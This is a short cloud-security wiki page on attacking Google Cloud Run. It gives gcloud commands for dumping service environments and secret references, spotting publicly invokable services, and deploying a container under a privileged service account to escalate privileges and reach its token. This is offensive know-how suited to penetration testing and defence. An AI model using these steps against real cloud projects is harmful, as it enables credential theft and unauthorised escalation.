---
title: "Cloud Run: unauthenticated services, revisions, and the attached service account"
description: "Attacking Cloud Run services and jobs: unauthenticated invocation, environment and revision secrets, and the attached runtime service account."
keywords:
  - Cloud Run
  - runtime service account
  - invocation
  - revision
  - environment
---

# Cloud Run

Cloud Run runs a container as an attached **service account**. Services expose an HTTPS endpoint (optionally public), and each **revision** carries its environment and secret references. Read access leaks those; deploy access runs your container as the service account.

## Reading the service, revisions, and environment

```bash
gcloud run services describe <svc> --region <r> \
  --format='value(spec.template.spec.serviceAccountName)'
gcloud run services describe <svc> --region <r> --format=export   # env vars, secret refs, image
gcloud run revisions list --service <svc> --region <r>
```

## Unauthenticated invocation

```bash
# a service with the allUsers invoker binding is reachable without creds
gcloud run services get-iam-policy <svc> --region <r>
curl -s https://<svc>-<hash>-<region>.a.run.app/
```

## Running as the attached service account

```bash
gcloud run deploy <svc> --region <r> --image <you>/img \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com \
  --allow-unauthenticated
# the container reads the SA token from the metadata server, as in Cloud Functions
```

## Exploitation notes

- Deploy requires `iam.serviceAccounts.actAs` on the attached SA, so this is a privilege-escalation path when that account outranks you.
- Cloud Run **jobs** (`gcloud run jobs create/execute`) run the same way without an HTTP endpoint, useful for a one-shot task under the SA.
- Secret Manager references in a revision resolve at runtime; dumping the revision config plus the container environment recovers them.

## Tools

- **gcloud** (`run deploy`, `services describe`, `run jobs`, `get-iam-policy`).

## References

- [HackTricks Cloud: GCP Cloud Run](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Cloud Run service identity](https://cloud.google.com/run/docs/securing/service-identity)
